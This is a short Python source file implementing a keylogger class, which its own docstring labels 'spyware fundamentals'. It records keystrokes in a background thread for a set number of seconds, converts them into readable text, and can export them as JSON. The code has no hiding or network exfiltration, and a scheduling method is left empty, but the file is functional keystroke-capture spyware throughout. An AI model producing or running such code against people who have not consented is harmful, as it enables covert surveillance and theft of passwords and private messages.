import keyboard  # Doesn't target Linux machines well as it requires root privileges
from threading import Thread, Lock
import time
import json

visual_keys = {
    "enter": "\n",
    "space": " ",
    "tab": "\t",
    "back": "",
    "shift": "",
}


class KeyLogger:
    """A class for representing keyloggers (Spyware fundamentals)"""

    def __init__(self):
        self._buffer = []
        self._mode = 0  # 0 - inactive, 1 - logging keys, 2 - taking a screenshot
        self._buffer_mutex, self._mode_mutex = Lock(), Lock()

    @property
    def buffer(self):
        return self._buffer

    @property
    def mode(self):
        return self._mode

    def start_logging_keys(self):
        self._mode_mutex.acquire()
        self._mode = 1
        self._mode_mutex.release()
        logging_thread = Thread(target=self._key_log_thread)
        logging_thread.start()

    def _key_log_thread(self):
        if self._mode == 1:
            keyboard.start_recording()

    def finish_current_event(self):
        self._mode_mutex.acquire()
        self._mode = 0
        self._mode_mutex.release()

    def stop_logging_keys(self):
        self._buffer_mutex.acquire()
        self._buffer = keyboard.stop_recording()
        self._buffer_mutex.release()

        self.finish_current_event()

    def schedule_keylog(self):  # schedule a key-logging task in a given time
        pass

    def log_keys_for(self, seconds: int):
        self.start_logging_keys()
        time.sleep(seconds)
        self.stop_logging_keys()
        return self._buffer

    def clear_buffer(self):
        self._buffer_mutex.acquire()
        self._buffer.clear()
        self._buffer_mutex.release()

    def get_string_log(self):  # TODO: consider typos?
        if not self._buffer:
            return ""
        string_log = []
        for event in self._buffer:
            if event.event_type == 'down':
                string_log.append(event.name)

        string_log = "".join(string_log)
        for key, item in visual_keys.items():
            string_log = string_log.replace(key, item)

        return string_log

    def print_string_log(self):
        print(self.get_string_log())

    def to_dicts(self):
        if not self._buffer:
            return []
        return [event.__dict__ for event in self._buffer]

    def to_json(self):
        return json.dumps(self.to_dicts())


def main():
    my_keylogger = KeyLogger()
    my_keylogger.log_keys_for(seconds=2)

if __name__ == '__main__':
    main()
